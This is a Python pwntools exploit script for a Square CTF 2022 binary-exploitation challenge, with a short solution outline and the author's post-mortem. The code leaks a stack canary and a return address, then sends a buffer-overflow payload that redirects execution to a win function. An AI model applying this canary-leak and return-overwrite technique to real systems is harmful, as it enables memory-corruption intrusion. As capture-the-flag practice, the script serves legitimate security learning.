""" Solution

    Leak the stack canary
    Use that to overwrite the leak_addr value and leak pointers on the stack
    Use those stack pointers to find the offset to print the flag
    """

""" Post Mortem

    Good to think about what you have, and what you can get, especially when on the stack
    Should probably get better at using struct for packing and unpacking bytes, or just develop the following functions
    - convert ascii bytes to bytes
    - convert bytes to ascii
    - or at least create little code snippets for it

    - I wonder if there is a better way to get offsets, without having to do this manually??
    - Need to practice better code cleanliness, helps for debugging when you make mistakes

    TODO: Develop a good way to wait for a specific line and grab data from it
    """


from pwn import *
from time import sleep

HOST = 'chals.2022.squarectf.com'
PORT = 4101

context.arch = 'amd64'
context.binary = 'ez-pwn-2'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def get_proc():
  proc = process()
  #proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
  set exception-verbose on
  break print_buf
  c
  c

  """)
  sleep(1)

def main():
  proc = get_proc()
  #attach_gdb(proc)

  proc.recvuntil(b'You are here: ')
  stack_ptr = proc.readline().strip()

  stack_ptr = bytes.fromhex(stack_ptr.decode('utf-8')[2:])

  canary_address = int.from_bytes(stack_ptr, 'big') + 24
  canary_address = hex(int.from_bytes(p64(canary_address), 'big'))[2:]
  
  # Read you are here pointer
  # Add bytes to get stack canary
  # Grab stack canary
  proc.sendlineafter(
    b'Give me an address and I will grant you 8 leaked bytes:',
    canary_address.encode('utf-8')
  )
  proc.readline()
  proc.readline()
  canary = proc.readline().strip()

  canary = bytes.fromhex(canary.decode())

  main_address = int.from_bytes(stack_ptr, 'big') + 40 
  main_address = hex(int.from_bytes(p64(main_address), 'big'))[2:]
  
  proc.sendlineafter(
    b'Give me an address and I will grant you 8 leaked bytes:',
    main_address.encode('utf-8')
  )

  proc.readline()
  proc.readline()
  main_address = proc.readline().strip()
  main_address = bytes.fromhex(main_address.decode())
  main_address = int.from_bytes(main_address, 'little')
  win_func = main_address - 0x110 - 26
  


  ebp = int.from_bytes(stack_ptr, 'big') + 0x30 

  payload = b''.join([
    canary_address.encode(),
    b'\x00',
    b'A' * 7,
    canary,
    p64(ebp),
    p64(win_func),
    p64(main_address)
  ])

  print(payload)

  proc.sendlineafter(
    b'Give me an address and I will grant you 8 leaked bytes:',
    payload
  )
  print(proc.readline())
  print(proc.readline())
  print(proc.readline())
  print(proc.readline())



if __name__ == '__main__':
  main()
